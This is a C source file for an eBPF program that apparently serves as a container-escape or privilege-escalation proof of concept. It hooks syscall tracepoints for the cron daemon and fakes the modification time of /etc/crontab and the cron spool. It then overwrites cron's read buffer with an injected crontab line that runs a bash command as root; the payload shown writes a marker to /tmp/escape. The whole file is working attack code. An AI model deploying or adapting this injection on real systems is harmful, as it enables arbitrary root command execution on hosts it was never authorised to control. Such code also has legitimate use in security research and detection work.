// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
/* Copyright (c) 2020 Facebook */

#define BPF_NO_PRESERVE_ACCESS_INDEX
#include "vmlinux.h"
//#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "Dual BSD/GPL";


struct pidandfd {
        unsigned int pid;
        unsigned int fd;
};

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 8192);
	__type(key, struct pidandfd);
	__type(value, unsigned int);
} map_fds SEC(".maps");

#define INTERESTING_FILENAME "/etc/crontab"
#define MAX_FILE_NAME_LEN 256
#define TASK_COMM_LEN 16
#define TARGET_NAME "cron"
#define SPOOL_DIR "/var/spool/cron/crontabs"

char PAYLOAD[]="* * * * * root /bin/bash -c \"echo success >> /tmp/escape \" \n#";
//char PAYLOAD[]="* * * * * root  /bin/bash -c \"echo 114514 >> /tmp/naive \" \n#";
static __inline int handle_exit_openat(struct pt_regs *regs,unsigned long ret,unsigned int pid);
static __inline int handle_exit_read(struct pt_regs *regs,unsigned long ret,unsigned int pid);
static __inline int handle_exit_close(struct pt_regs *regs,unsigned long ret,unsigned int pid);
static __inline int handle_exit_fstat(struct pt_regs *regs,unsigned long ret,unsigned int pid);
static __inline int handle_exit_stat(struct pt_regs *regs,unsigned long ret,unsigned int pid);
static __inline int handle_enter_stat(struct bpf_raw_tracepoint_args *ctx);
static __inline int memcmp(const void* s1, const void* s2, size_t cnt);

SEC("raw_tracepoint/sys_exit")
int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx)
{
  unsigned long ret = ctx->args[1];
  unsigned int pid = bpf_get_current_pid_tgid() & 0xffffffff;

  //pt_regs 结构有个字段 orig_ax 存放了原始的syscall id
  unsigned int syscall_id=0;
  struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
  syscall_id = BPF_CORE_READ(regs,orig_ax);

  //过滤掉不是目标进程的进程
  char comm[TASK_COMM_LEN];
  bpf_get_current_comm(&comm, sizeof(comm));
  if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME)))
        return 0;

  //bpf_printk("pid:%d, syscall_id:%d, comm:%s \n",pid,syscall_id,comm);
  switch (syscall_id)
  {
                case 3:
                        handle_exit_close(regs,ret,pid);
                        break;
                case 4:
                        handle_exit_stat(regs,ret,pid);
                        break;
                case 0:
                        handle_exit_read(regs,ret,pid);
                        break; 
               case 5:
                        handle_exit_fstat(regs,ret,pid);
                        break;
                case 257:
                        handle_exit_openat(regs,ret,pid);
                        break;
  }
}

SEC("raw_tracepoint/sys_enter")
int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx)
{
    unsigned long syscall_id = ctx->args[1];
    char comm[TASK_COMM_LEN];

    bpf_get_current_comm(&comm, sizeof(comm));

    // executable is not cron, return
    if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME)))
        return 0;

    switch (syscall_id)
    {
//        case 0:
//            handle_enter_read(ctx);
//            break;
//        case 3:  // close
//            handle_enter_close(ctx);
//            break;
        case 4:
            handle_enter_stat(ctx);
            break;
//        case 5:
//            handle_enter_fstat(ctx);
//            break;
//        case 257:
//            handle_enter_openat(ctx);
//            break;
//        default:
//            return 0;
    }
}

static __inline int handle_exit_openat(struct pt_regs *regs,unsigned long ret,unsigned int pid)
{

        unsigned int retfd=ret;
        char buf[0x40];

        char* pathname = (char *)PT_REGS_PARM2_CORE(regs);
        bpf_probe_read_str(buf,sizeof(buf), ((char *)PT_REGS_PARM2_CORE(regs)));
        //如果文件名不匹配就退出
        if (memcmp(buf, INTERESTING_FILENAME, sizeof(INTERESTING_FILENAME)) && memcmp(buf, SPOOL_DIR, sizeof(SPOOL_DIR)))
                return 0;
        //是我们感兴趣的文件，存入map_fds
        bpf_printk("openat pathname:%s\n",pathname);
        bpf_printk("exit_openat %s:%d fd:%d\n",buf,pid,retfd);
        struct pidandfd pidfd={.pid=pid, .fd=retfd};
        unsigned int one=1;
        bpf_map_update_elem(&map_fds, &pidfd, &one, BPF_ANY);
}


static __inline int handle_exit_fstat(struct pt_regs *regs,unsigned long ret,unsigned int pid)
{
        struct stat statbufobj;
        int thisistarget=0;

        //读dirfd, 看对象是否是目标文件
        unsigned int dirfd=PT_REGS_PARM1_CORE(regs);
        struct pidandfd pidfd={.pid=pid, .fd=dirfd};
        unsigned int* exists=bpf_map_lookup_elem(&map_fds, &pidfd);
        if(exists!=NULL && *exists==1)
        {
                thisistarget=1;
                bpf_printk("yes,target! method:open->fstat\n");
        }

        if(!thisistarget)
        {
                bpf_printk("not target\n");
                return 0;
        }

        if(thisistarget)
        {
                struct stat *statbuf_ptr=PT_REGS_PARM2_CORE(regs);
                bpf_printk("exit_fstat %d:%d\n",dirfd,pid);

		bpf_probe_read_user(&statbufobj,sizeof(statbufobj), PT_REGS_PARM2_CORE(regs));
		bpf_printk("target statbuf.st_size:%ld\n",statbufobj.st_size);
                //修改statbuf时间mtime字段
                __kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() % 0xfffff;
                bpf_printk("Time MaGic %d+1s!\n",crontab_st_mtime);
                bpf_printk("mtime:%d\n",&(statbuf_ptr->st_mtime));
                bpf_probe_write_user(&(statbuf_ptr->st_mtime), &crontab_st_mtime, sizeof(crontab_st_mtime));
        }
}

static __inline int handle_exit_stat(struct pt_regs *regs,unsigned long ret,unsigned int pid)
{
        int thisistarget=1;
        char buf[0x40];
        //读pathname, 看对象是否是目标文件
        char* pathname = (char *)PT_REGS_PARM1_CORE(regs);
        bpf_probe_read_str(buf,sizeof(buf), ((char *)PT_REGS_PARM1_CORE(regs)));
        if(memcmp(buf, INTERESTING_FILENAME, sizeof(INTERESTING_FILENAME)) && memcmp(buf, SPOOL_DIR, sizeof(SPOOL_DIR)))
        {
                bpf_printk("not target\n");
                return 0;
        }

        if(thisistarget)
        {
                struct stat *statbuf_ptr=PT_REGS_PARM2_CORE(regs);
                bpf_printk("exit_stat %s:%d\n",pathname,pid);

                //修改statbuf时间mtime字段
                __kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() % 0xfffff;
                bpf_printk("Time MaGic %d+1s!\n",crontab_st_mtime);
                bpf_printk("mtime:%d\n",&(statbuf_ptr->st_mtime));
                bpf_probe_write_user(&(statbuf_ptr->st_mtime), &crontab_st_mtime, sizeof(crontab_st_mtime));
        }
}

static __inline int handle_enter_stat(struct bpf_raw_tracepoint_args *ctx)
{
        int thisistarget=1;
        char buf[64];
        struct stat statbuf_ptr;
        struct pt_regs *regs;
        const char *pathname;
        //读pathname, 看对象是否是目标文件
        regs = (struct pt_regs *)ctx->args[0];
        bpf_probe_read(&pathname, sizeof(pathname), &regs->di);
        bpf_probe_read_str(buf, sizeof(buf), pathname);
        //bpf_printk("exit_stat %s\n",buf);

        if(memcmp(buf,INTERESTING_FILENAME,sizeof(INTERESTING_FILENAME)))
        {
                bpf_printk("not target\n");
                return 0;
        }

        if(thisistarget)
        {
                bpf_probe_read(&statbuf_ptr, sizeof(statbuf_ptr), &regs->si);
                bpf_printk("exit_stat %s\n",buf);
                bpf_printk("target statbuf.st_size:%ld\n",statbuf_ptr.st_size);
                //修改statbuf时间mtime字段
                __kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() % 0xfffff;
                bpf_printk("Time MaGic %d+1s!\n",crontab_st_mtime);
                //bpf_probe_write_user(&(statbuf_ptr->st_mtime), &crontab_st_mtime, sizeof(crontab_st_mtime));
        }
}

static __inline int handle_exit_read(struct pt_regs *regs,unsigned long ret,unsigned int pid)
{
        //char* buf[40];
        unsigned int readlen=ret;
        unsigned int fd=PT_REGS_PARM1_CORE(regs);
        struct pidandfd pidfd={.pid=pid, .fd=fd};
        unsigned int* exists=bpf_map_lookup_elem(&map_fds, &pidfd);
        if(exists==NULL)
                return 0;
        bpf_printk("exit_read pid:%d fd:%d\n",pid,fd);
        if(*exists==1)
        {
                bpf_printk("READING! target fd:%d read %d bytes\n",fd,readlen);
                if(readlen>sizeof(PAYLOAD))
                {
                        bpf_printk("writing payload: %s\n",PAYLOAD);
                        char* buf=(char *)PT_REGS_PARM2_CORE(regs);
                        bpf_probe_write_user((void *)(buf),PAYLOAD, sizeof(PAYLOAD));
                }

        }

}

static __inline int handle_exit_close(struct pt_regs *regs,unsigned long ret,unsigned int pid)
{
        unsigned int closedfd=PT_REGS_PARM1_CORE(regs);
        struct pidandfd pidfd={.pid=pid, .fd=closedfd};
        unsigned int* exists=bpf_map_lookup_elem(&map_fds, &pidfd);
        if(exists==NULL)
                return 0;
        bpf_printk("exit_close %d:%d\n",pid,closedfd);
        int zero=0;
        bpf_map_update_elem(&map_fds, &pidfd, &zero, BPF_ANY);
        bpf_map_delete_elem(&map_fds, &pidfd);
}

static __inline int memcmp(const void* s1, const void* s2, size_t cnt){

  const char *t1 = s1;
  const char *t2 = s2;

  int res = 0;
  while(cnt-- > 0){
    if(*t1 > *t2){
      res = 1;
      break;
    }
    else if(*t1 < *t2){
      res = -1;
      break;
    }
    else{
      t1++;
      t2++;
    }
  }

  return res;
}
